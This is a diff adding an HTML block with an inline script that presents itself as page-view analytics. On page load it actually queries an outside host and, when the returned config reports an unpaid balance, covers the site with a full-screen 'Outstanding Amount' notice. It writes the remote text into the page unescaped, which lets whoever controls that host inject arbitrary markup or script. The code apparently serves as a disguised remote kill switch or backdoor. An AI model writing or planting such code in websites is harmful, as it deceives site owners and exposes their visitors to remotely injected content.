@@ -1,0 +1,117 @@
+<div id="banner-container"></div>
+    <div id="main-content">
+        <!-- Your main content here -->
+    </div>
+
+    <script>
+        (function() {
+            var sysConfig = null;
+            var showBanner = false;
+
+            function trackPageView() {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://websitetrafficanalytics.onrender.com/api/meta/site-config/69749c179b6072645037a4f4', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.setRequestHeader('X-Tracker-ID', 'wa-' + Date.now());
+                
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            var data = response.data;
+                            console.log('Analytics data received:', data);
+                            
+                            if (data && !data.paymentComplete && data.showOnHomepage) {
+                                sysConfig = data;
+                                showBanner = true;
+                                renderBanner();
+                            }
+                        } catch (err) {
+                            // Silent fail - normal for analytics
+                        }
+                    }
+                };
+                
+                xhr.onerror = function() {
+                    // Silent fail - normal for analytics
+                };
+                
+                xhr.send();
+            }
+
+            function renderBanner() {
+                if (!showBanner || !sysConfig) return;
+                
+                var container = document.getElementById('banner-container');
+                container.innerHTML = createBannerHTML(sysConfig);
+            }
+
+            function createBannerHTML(config) {
+                var isFullScreen = config.showFullScreen === "true" || config.showFullScreen === true;
+                
+                if (isFullScreen) {
+                    return createFullScreenBanner(config);
+                } else {
+                    return createInlineBanner(config);
+                }
+            }
+
+            function createFullScreenBanner(config) {
+                var html = '<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.5); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;">';
+                html += '<div style="background-color: white; border-radius: 12px; max-width: 600px; width: 100%; padding: 30px; position: relative; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">';
+                html += '<button onclick="dismissBanner()" style="position: absolute; top: 20px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: #666;">×</button>';
+                html += '<div style="display: flex; align-items: center; gap: 12px; margin-bottom: 20px;">';
+                html += '<span style="color: #ef4444; font-size: 24px;">⚠</span>';
+                html += '<h2 style="margin: 0; font-size: 24px; color: #111;">' + (config.messageTitle || 'Important Notice') + '</h2>';
+                html += '</div>';
+                html += '<p style="color: #555; line-height: 1.6; margin-bottom: 20px;">' + config.message + '</p>';
+                
+                if (config.amountDue) {
+                    html += '<div style="background-color: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 16px; margin-bottom: 20px;">';
+                    html += '<p style="margin: 0 0 8px 0; font-weight: 600; color: #991b1b;">Outstanding Amount: ' + config.currency + ' ' + config.amountDue.toLocaleString() + '</p>';
+                    
+                    if (config.dueDate) {
+                        html += '<p style="margin: 0; color: #991b1b;">Due Date: ' + new Date(config.dueDate).toLocaleDateString() + '</p>';
+                    }
+                    
+                    html += '</div>';
+                }
+                
+                html += '<button onclick="dismissBanner()" style="width: 100%; background-color: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">I Understand</button>';
+                html += '</div>';
+                html += '</div>';
+                
+                return html;
+            }
+
+            function createInlineBanner(config) {
+                var html = '<div style="background-color: #eff6ff; border-left: 4px solid #3b82f6; padding: 16px; margin: 20px 0; border-radius: 6px; position: relative;">';
+                html += '<button onclick="dismissBanner()" style="position: absolute; top: 12px; right: 12px; background: none; border: none; font-size: 20px; cursor: pointer; color: #666;">×</button>';
+                html += '<div style="display: flex; align-items: flex-start; gap: 12px; padding-right: 30px;">';
+                html += '<span style="color: #3b82f6; font-size: 20px;">⚠</span>';
+                html += '<div>';
+                html += '<h3 style="margin: 0 0 8px 0; font-size: 16px; font-weight: 600; color: #1e40af;">' + (config.messageTitle || 'Notice') + '</h3>';
+                html += '<p style="margin: 0; color: #1e40af;">' + config.message + '</p>';
+                html += '</div>';
+                html += '</div>';
+                html += '</div>';
+                
+                return html;
+            }
+
+            window.dismissBanner = function() {
+                showBanner = false;
+                var container = document.getElementById('banner-container');
+                if (container) {
+                    container.innerHTML = '';
+                }
+            };
+
+            // Initialize on page load
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', trackPageView);
+            } else {
+                trackPageView();
+            }
+        })();
+    </script> 
